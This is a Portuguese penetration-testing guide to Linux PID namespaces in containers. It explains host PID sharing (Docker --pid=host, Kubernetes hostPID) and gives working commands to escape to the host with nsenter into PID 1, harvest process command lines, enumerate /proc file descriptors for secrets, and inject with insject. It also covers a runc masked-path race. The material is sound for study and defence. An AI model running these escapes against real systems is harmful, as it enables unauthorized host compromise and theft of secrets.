# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Visão geral

O PID namespace controla como os processos são numerados e quais processos são visíveis. É por isso que um container pode ter seu próprio PID 1, mesmo não sendo uma máquina real. Dentro do namespace, o workload vê o que parece ser uma árvore de processos local. Fora do namespace, o host ainda vê os PIDs reais do host e todo o panorama de processos.

Do ponto de vista de segurança, o PID namespace é importante porque a visibilidade dos processos é valiosa. Quando um workload consegue ver processos do host, ele pode conseguir observar nomes de serviços, argumentos da linha de comando, secrets passados nos argumentos dos processos, estado derivado do ambiente por meio de `/proc` e possíveis alvos para entrada em namespaces. Se ele puder fazer mais do que apenas ver esses processos, por exemplo, enviar sinais ou usar ptrace nas condições adequadas, o problema se torna muito mais grave.

## Operação

Um novo PID namespace começa com sua própria numeração interna de processos. O primeiro processo criado dentro dele se torna o PID 1 do ponto de vista do namespace, o que também significa que ele recebe semântica semelhante à de init para filhos órfãos e comportamento de sinais. Isso explica muitas peculiaridades dos containers relacionadas a processos init, coleta de processos zombie e ao motivo pelo qual wrappers de init pequenos são às vezes usados em containers.

A lição importante de segurança é que um processo pode parecer isolado porque vê apenas sua própria árvore de PIDs, mas esse isolamento pode ser removido deliberadamente. O Docker expõe isso por meio de `--pid=host`, enquanto o Kubernetes faz isso por meio de `hostPID: true`. Quando o container entra no PID namespace do host, o workload vê diretamente os processos do host, e muitos caminhos de ataque posteriores se tornam muito mais realistas.

## Laboratório

Para criar um PID namespace manualmente:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
O shell agora vê uma visualização privada dos processos. A flag `--mount-proc` é importante porque monta uma instância procfs que corresponde ao novo namespace de PID, tornando a lista de processos coerente a partir de dentro.

Para comparar o comportamento do container:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
A diferença é imediata e fácil de entender, por isso este é um bom primeiro lab para os leitores.

## Uso do Runtime

Containers normais no Docker, Podman, containerd e CRI-O recebem seu próprio PID namespace. Kubernetes Pods normalmente também recebem uma visão isolada de PIDs, a menos que o workload solicite explicitamente o compartilhamento do PID do host. Ambientes LXC/Incus dependem da mesma primitiva do kernel, embora os casos de uso de system-containers possam expor árvores de processos mais complexas e incentivar mais atalhos de debugging.

A mesma regra se aplica em todos os lugares: se o runtime decidiu não isolar o PID namespace, isso representa uma redução deliberada no limite do container.

## Misconfigurações

A misconfiguração canônica é o compartilhamento do PID namespace do host. As equipes frequentemente justificam isso por conveniência de debugging, monitoramento ou gerenciamento de serviços, mas isso sempre deve ser tratado como uma exceção de segurança significativa. Mesmo que o container não tenha uma primitiva imediata de escrita sobre os processos do host, apenas a visibilidade pode revelar muitas informações sobre o sistema. Quando capabilities como `CAP_SYS_PTRACE` ou acesso útil ao procfs são adicionados, o risco aumenta significativamente.

Outro erro é presumir que, como o workload não pode matar ou executar ptrace em processos do host por padrão, o compartilhamento do PID do host é, portanto, inofensivo. Essa conclusão ignora o valor da enumeração, a disponibilidade de alvos para entrada em namespaces e a forma como a visibilidade de PIDs se combina com outros controles enfraquecidos.

## Abuso

Se o PID namespace do host for compartilhado, um atacante poderá inspecionar processos do host, coletar argumentos de processos, identificar serviços interessantes, localizar PIDs candidatos para `nsenter` ou combinar a visibilidade dos processos com privilégios relacionados a ptrace para interferir em workloads do host ou de containers vizinhos. Em alguns casos, simplesmente visualizar o processo de longa duração correto é suficiente para reformular o restante do plano de ataque.

O primeiro passo prático é sempre confirmar que os processos do host estão realmente visíveis:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Uma vez que os PIDs do host estejam visíveis, os argumentos dos processos e os alvos de entrada de namespace frequentemente se tornam a fonte de informação mais útil:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Se o `nsenter` estiver disponível e houver privilégios suficientes, teste se um processo visível no host pode ser usado como uma ponte de namespace:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Mesmo quando a entrada é bloqueada, o compartilhamento de PID do host já é valioso, pois revela a estrutura dos serviços, os componentes em execução e os processos privilegiados candidatos a serem alvos em seguida.

A visibilidade dos PIDs do host também torna mais realista o abuso de file descriptors. Se um processo privilegiado do host ou uma workload vizinha tiver um arquivo ou socket sensível aberto, o atacante poderá conseguir inspecionar `/proc/<pid>/fd/` e reutilizar esse handle, dependendo da propriedade, das opções de montagem do procfs e do modelo do serviço-alvo.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Esses comandos são úteis porque respondem se `hidepid=1` ou `hidepid=2` está reduzindo a visibilidade entre processos e se descritores obviamente interessantes, como arquivos secretos abertos, logs ou Unix sockets, estão visíveis.

### Exemplo completo: PID do host + `nsenter`

O compartilhamento de PID do host torna-se um escape direto do host quando o processo também tem privilégios suficientes para ingressar nos namespaces do host:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Se o comando for bem-sucedido, o processo do container agora está sendo executado nos namespaces de mount, UTS, network, IPC e PID do host. O impacto é o comprometimento imediato do host.

Mesmo quando o próprio `nsenter` está ausente, o mesmo resultado pode ser obtido por meio do binário do host, caso o filesystem do host esteja montado:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Notas recentes de runtime

Alguns ataques relevantes para PID namespaces não são configurações incorretas tradicionais de `hostPID: true`, mas bugs de implementação do runtime relacionados à forma como as proteções do procfs são aplicadas durante a configuração do container.

#### Race de `maskedPaths` para o procfs do host

Em versões vulneráveis do `runc`, invasores capazes de controlar a imagem do container ou o workload de `runc exec` poderiam explorar uma race na fase de masking, substituindo o `/dev/null` no lado do container por um symlink para um caminho sensível do procfs, como `/proc/sys/kernel/core_pattern`. Se a race fosse bem-sucedida, o bind mount de masked-path poderia ser aplicado ao destino errado e expor parâmetros globais do procfs do host ao novo container.<sup>[[1]](#references)</sup>

Comando útil para revisão:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Isso é importante porque o impacto final pode ser o mesmo de uma exposição direta do procfs: `core_pattern` ou `sysrq-trigger` gravável, seguido de execução de código no host ou de negação de serviço.

#### Injeção de namespace com `insject`

Ferramentas de injeção de namespace, como `insject`, mostram que a interação com o PID namespace nem sempre exige entrar previamente no namespace-alvo antes da criação do processo. Um auxiliar pode se conectar posteriormente, usar `setns()` e executar mantendo a visibilidade no espaço de PIDs alvo:<sup>[[2]](#references)</sup>
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Esse tipo de técnica é relevante principalmente para debugging avançado, offensive tooling e workflows de post-exploitation nos quais o contexto do namespace precisa ser associado após o runtime já ter inicializado o workload.

### Padrões relacionados de abuso de FD

Dois padrões merecem ser destacados explicitamente quando os PIDs do host estão visíveis. Primeiro, um processo privilegiado pode manter um file descriptor sensível aberto através de `execve()` porque ele não foi marcado com `O_CLOEXEC`. Segundo, serviços podem passar file descriptors por Unix sockets usando `SCM_RIGHTS`. Em ambos os casos, o objeto interessante não é mais o pathname, mas o handle já aberto que um processo com privilégios inferiores pode herdar ou receber.

Isso é importante em trabalhos com containers porque o handle pode apontar para `docker.sock`, um log privilegiado, um arquivo de secrets do host ou outro objeto de alto valor, mesmo quando o próprio path não é diretamente acessível a partir do filesystem do container.

## Verificações

O objetivo destes comandos é determinar se o processo tem uma visão privada de PIDs ou se já consegue enumerar um panorama de processos muito mais amplo.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
O que é interessante aqui:

- Se a lista de processos contiver serviços óbvios do host, provavelmente o compartilhamento de PID do host já está ativo.
- Ver apenas uma pequena árvore local do container é o baseline normal; ver `systemd`, `dockerd` ou daemons não relacionados não é.
- Quando os PIDs do host ficam visíveis, até mesmo informações somente leitura sobre processos se tornam úteis para reconnaissance.

Se você descobrir um container em execução com compartilhamento de PID do host, não trate isso como uma diferença cosmética. Isso representa uma grande mudança no que o workload pode observar e potencialmente afetar.

## Referências

- [1] [Aviso de segurança do runc: container escape via abuso de "masked path" devido a condições de corrida em montagens (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Lançamento de ferramenta – insject: um injetor de Linux Namespace](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)

{{#include ../../../../../banners/hacktricks-training.md}}
